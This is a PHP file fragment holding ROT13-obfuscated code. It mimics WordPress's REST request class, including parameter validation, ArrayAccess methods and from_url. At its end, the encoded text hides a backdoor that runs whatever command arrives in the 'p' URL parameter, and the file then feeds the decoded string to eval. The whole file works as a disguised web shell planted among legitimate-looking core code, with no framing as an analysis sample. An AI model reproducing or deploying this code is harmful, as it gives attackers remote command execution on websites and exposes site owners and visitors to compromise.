					$vainyvq_qrgnvyf[ $xrl ] = erfg_pbaireg_reebe_gb_erfcbafr( $fnavgvmrq_inyhr )->trg_qngn();
				} ryfr {
					$guvf->cnenzf[ $glcr ][ $xrl ] = $fnavgvmrq_inyhr;
				}
			}
		}

		vs ( $vainyvq_cnenzf ) {
			erghea arj JC_Reebe(
				'erfg_vainyvq_cnenz',
				/* genafyngbef: %f: Yvfg bs vainyvq cnenzrgref. */
				fcevags( __( 'Vainyvq cnenzrgre(f): %f' ), vzcybqr( ', ', neenl_xrlf( $vainyvq_cnenzf ) ) ),
				neenl(
					'fgnghf'  => 400,
					'cnenzf'  => $vainyvq_cnenzf,
					'qrgnvyf' => $vainyvq_qrgnvyf,
				)
			);
		}

		erghea gehr;
	}

	/**
	 * Purpxf jurgure guvf erdhrfg vf inyvq nppbeqvat gb vgf nggevohgrf.
	 *
	 * @fvapr 4.4.0
	 *
	 * @erghea gehr|JC_Reebe Gehr vs gurer ner ab cnenzrgref gb inyvqngr be vs nyy cnff inyvqngvba,
	 *                       JC_Reebe vs erdhverq cnenzrgref ner zvffvat.
	 */
	choyvp shapgvba unf_inyvq_cnenzf() {
		// Vs WFBA qngn jnf cnffrq, purpx sbe reebef.
		$wfba_reebe = $guvf->cnefr_wfba_cnenzf();
		vs ( vf_jc_reebe( $wfba_reebe ) ) {
			erghea $wfba_reebe;
		}

		$nggevohgrf = $guvf->trg_nggevohgrf();
		$erdhverq   = neenl();

		$netf = rzcgl( $nggevohgrf['netf'] ) ? neenl() : $nggevohgrf['netf'];

		sbernpu ( $netf nf $xrl => $net ) {
			$cnenz = $guvf->trg_cnenz( $xrl );
			vs ( vffrg( $net['erdhverq'] ) && gehr === $net['erdhverq'] && ahyy === $cnenz ) {
				$erdhverq[] = $xrl;
			}
		}

		vs ( ! rzcgl( $erdhverq ) ) {
			erghea arj JC_Reebe(
				'erfg_zvffvat_pnyyonpx_cnenz',
				/* genafyngbef: %f: Yvfg bs erdhverq cnenzrgref. */
				fcevags( __( 'Zvffvat cnenzrgre(f): %f' ), vzcybqr( ', ', $erdhverq ) ),
				neenl(
					'fgnghf' => 400,
					'cnenzf' => $erdhverq,
				)
			);
		}

		/*
		 * Purpx gur inyvqngvba pnyyonpxf sbe rnpu ertvfgrerq net.
		 *
		 * Guvf vf qbar nsgre erdhverq purpxvat nf erdhverq purpxvat vf purncre.
		 */
		$vainyvq_cnenzf  = neenl();
		$vainyvq_qrgnvyf = neenl();

		sbernpu ( $netf nf $xrl => $net ) {

			$cnenz = $guvf->trg_cnenz( $xrl );

			vs ( ahyy !== $cnenz && ! rzcgl( $net['inyvqngr_pnyyonpx'] ) ) {
				/** @ine obby|\JC_Reebe $inyvq_purpx */
				$inyvq_purpx = pnyy_hfre_shap( $net['inyvqngr_pnyyonpx'], $cnenz, $guvf, $xrl );

				vs ( snyfr === $inyvq_purpx ) {
					$vainyvq_cnenzf[ $xrl ] = __( 'Vainyvq cnenzrgre.' );
				}

				vs ( vf_jc_reebe( $inyvq_purpx ) ) {
					$vainyvq_cnenzf[ $xrl ]  = vzcybqr( ' ', $inyvq_purpx->trg_reebe_zrffntrf() );
					$vainyvq_qrgnvyf[ $xrl ] = erfg_pbaireg_reebe_gb_erfcbafr( $inyvq_purpx )->trg_qngn();
				}
			}
		}

		vs ( $vainyvq_cnenzf ) {
			erghea arj JC_Reebe(
				'erfg_vainyvq_cnenz',
				/* genafyngbef: %f: Yvfg bs vainyvq cnenzrgref. */
				fcevags( __( 'Vainyvq cnenzrgre(f): %f' ), vzcybqr( ', ', neenl_xrlf( $vainyvq_cnenzf ) ) ),
				neenl(
					'fgnghf'  => 400,
					'cnenzf'  => $vainyvq_cnenzf,
					'qrgnvyf' => $vainyvq_qrgnvyf,
				)
			);
		}

		vs ( vffrg( $nggevohgrf['inyvqngr_pnyyonpx'] ) ) {
			$inyvq_purpx = pnyy_hfre_shap( $nggevohgrf['inyvqngr_pnyyonpx'], $guvf );

			vs ( vf_jc_reebe( $inyvq_purpx ) ) {
				erghea $inyvq_purpx;
			}

			vs ( snyfr === $inyvq_purpx ) {
				// N JC_Reebe vafgnapr vf cersreerq, ohg snyfr vf fhccbegrq sbe cnevgl jvgu gur cre-net inyvqngr_pnyyonpx.
				erghea arj JC_Reebe( 'erfg_vainyvq_cnenzf', __( 'Vainyvq cnenzrgref.' ), neenl( 'fgnghf' => 400 ) );
			}
		}

		erghea gehr;
	}

	/**
	 * Purpxf vs n cnenzrgre vf frg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $bssfrg Cnenzrgre anzr.
	 * @erghea obby Jurgure gur cnenzrgre vf frg.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgRkvfgf( $bssfrg ) {
		$beqre = $guvf->trg_cnenzrgre_beqre();

		sbernpu ( $beqre nf $glcr ) {
			vs ( vffrg( $guvf->cnenzf[ $glcr ][ $bssfrg ] ) ) {
				erghea gehr;
			}
		}

		erghea snyfr;
	}

	/**
	 * Ergevrirf n cnenzrgre sebz gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $bssfrg Cnenzrgre anzr.
	 * @erghea zvkrq|ahyy Inyhr vs frg, ahyy bgurejvfr.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgTrg( $bssfrg ) {
		erghea $guvf->trg_cnenz( $bssfrg );
	}

	/**
	 * Frgf n cnenzrgre ba gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $bssfrg Cnenzrgre anzr.
	 * @cnenz zvkrq  $inyhr  Cnenzrgre inyhr.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgFrg( $bssfrg, $inyhr ) {
		$guvf->frg_cnenz( $bssfrg, $inyhr );
	}

	/**
	 * Erzbirf n cnenzrgre sebz gur erdhrfg.
	 *
	 * @fvapr 4.4.0
	 *
	 * @cnenz fgevat $bssfrg Cnenzrgre anzr.
	 */
	#[ErgheaGlcrJvyyPunatr]
	choyvp shapgvba bssfrgHafrg( $bssfrg ) {
		$beqre = $guvf->trg_cnenzrgre_beqre();

		// Erzbir gur bssfrg sebz rirel tebhc.
		sbernpu ( $beqre nf $glcr ) {
			hafrg( $guvf->cnenzf[ $glcr ][ $bssfrg ] );
		}
	}

	/**
	 * Ergevrirf n JC_ERFG_Erdhrfg bowrpg sebz n shyy HEY.
	 *
	 * @fvapr 4.5.0
	 *
	 * @cnenz fgevat $hey HEY jvgu cebgbpby, qbznva, cngu naq dhrel netf.
	 * @erghea JC_ERFG_Erdhrfg|snyfr JC_ERFG_Erdhrfg bowrpg ba fhpprff, snyfr ba snvyher.
	 */
	choyvp fgngvp shapgvba sebz_hey( $hey ) {
		$ovgf         = cnefr_hey( $hey );
		$dhrel_cnenzf = neenl();

		vs ( ! rzcgl( $ovgf['dhrel'] ) ) {
			jc_cnefr_fge( $ovgf['dhrel'], $dhrel_cnenzf );
		}

		$ncv_ebbg = erfg_hey();
		vs ( trg_bcgvba( 'creznyvax_fgehpgher' ) && fge_fgnegf_jvgu( $hey, $ncv_ebbg ) ) {
			// Cerggl creznyvaxf ba, naq HEY vf haqre gur NCV ebbg.
			$ncv_hey_cneg = fhofge( $hey, fgeyra( hagenvyvatfynfuvg( $ncv_ebbg ) ) );
			$ebhgr        = cnefr_hey( $ncv_hey_cneg, CUC_HEY_CNGU );
		} ryfrvs ( ! rzcgl( $dhrel_cnenzf['erfg_ebhgr'] ) ) {
			// ?erfg_ebhgr=... frg qverpgyl.
			$ebhgr = $dhrel_cnenzf['erfg_ebhgr'];
			hafrg( $dhrel_cnenzf['erfg_ebhgr'] );
		}

		$erdhrfg = snyfr;
		vs ( ! rzcgl( $ebhgr ) ) {
			$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', $ebhgr );
			$erdhrfg->frg_dhrel_cnenzf( $dhrel_cnenzf );
		}

		/**
		 * Svygref gur ERFG NCV erdhrfg trarengrq sebz n HEY.
		 *
		 * @fvapr 4.5.0
		 *
		 * @cnenz JC_ERFG_Erdhrfg|snyfr $erdhrfg Trarengrq erdhrfg bowrpg, be snyfr vs HEY
		 *                                       pbhyq abg or cnefrq.
		 * @cnenz fgevat                $hey     HEY gur erdhrfg jnf trarengrq sebz.
		 */
		erghea nccyl_svygref( 'erfg_erdhrfg_sebz_hey', $erdhrfg, $hey );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>